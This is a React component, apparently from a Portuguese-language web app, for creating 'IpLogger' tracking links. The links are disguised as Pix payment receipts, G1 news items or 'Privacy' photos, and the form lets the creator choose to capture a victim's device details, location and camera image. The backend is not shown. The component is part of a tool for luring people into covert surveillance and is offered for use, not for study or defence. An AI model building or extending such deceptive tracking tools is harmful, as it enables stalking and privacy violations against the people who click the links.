import { api } from "../../services/api";
import { useEffect, useState } from "react";
import { useCookies } from "react-cookie";
import { useNavigate } from 'react-router-dom';

export function CreateIpLoggerComponent() {
    const navigate = useNavigate();
    const [cookies, setCookie] = useCookies(['session']);
    const [formData, setFormData] = useState({
        template: {},
        title_preview: "",
        description_preview: "",
        image_preview: {},
        device_data: false,
        location_data: false,
        cam_data: false
    });
    const [selectedTemplate, setSelectedTemplate] = useState("Comprovante de Pix");

    useEffect(() => {
        const initializeSession = async () => {
            try {
                const response = await api.post('/user/start_session');
                setCookie('session', response.data.session, { path: '/' });
            } catch (error) {
                console.error("Error initializing session:", error);
            }
        };

        if (!cookies.session) {
            initializeSession();
        }
    }, [cookies.session, setCookie]);

    const handleTemplateChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
        setSelectedTemplate(e.target.value);

        setFormData({
            ...formData,
            template: { type: e.target.value }
        });
    };

    const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, checked } = e.target;
        setFormData({
            ...formData,
            [name]: checked
        });
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        
        if (!cookies.session) {
            alert("Sessão não inicializada. Por favor, recarregue a página.");
            return;
        }

        try {
            const payload = {
                user_id: cookies.session,
                template: formData.template,
                title_preview: selectedTemplate,
                description_preview: `Link gerado para ${selectedTemplate}`,
                image_preview: formData.image_preview,
                device_data: formData.device_data,
                location_data: formData.location_data,
                cam_data: formData.cam_data
            };

            await api.post('/user/create_iplogger', payload);
            alert("IpLogger criado com sucesso!")
            navigate("/badtrips")
        } catch (error) {
            console.error("Error creating IpLogger:", error);
            alert("Erro ao criar IpLogger. Por favor, tente novamente.");
        }
    };

    return (
        <form onSubmit={handleSubmit}>
            <select value={selectedTemplate} onChange={handleTemplateChange}>
                <option value="Comprovante de Pix">Comprovante de Pix</option>
                <option value="Notícia do G1">Notícia do G1</option>
                <option value="Foto do Privacy">Foto do Privacy</option>
            </select>
            
            <div className="checkbox-data">
                <label>Dados a serem capturados:</label>
                <ul>
                    <li>
                        <input 
                            type="checkbox" 
                            id="device" 
                            name="device_data" 
                            checked={formData.device_data}
                            onChange={handleCheckboxChange}
                        />
                        <label htmlFor="device">Dispositivo Utilizado</label>
                    </li>
                    <li>
                        <input 
                            type="checkbox" 
                            id="location" 
                            name="location_data" 
                            checked={formData.location_data}
                            onChange={handleCheckboxChange}
                        />
                        <label htmlFor="location">Localização</label>
                    </li>
                    <li>
                        <input 
                            type="checkbox" 
                            id="picture" 
                            name="cam_data" 
                            checked={formData.cam_data}
                            onChange={handleCheckboxChange}
                        />
                        <label htmlFor="picture">Câmera</label>
                    </li>
                </ul>
            </div>
            
            <button type="submit">Criar IpLogger</button>
        </form>
    );
}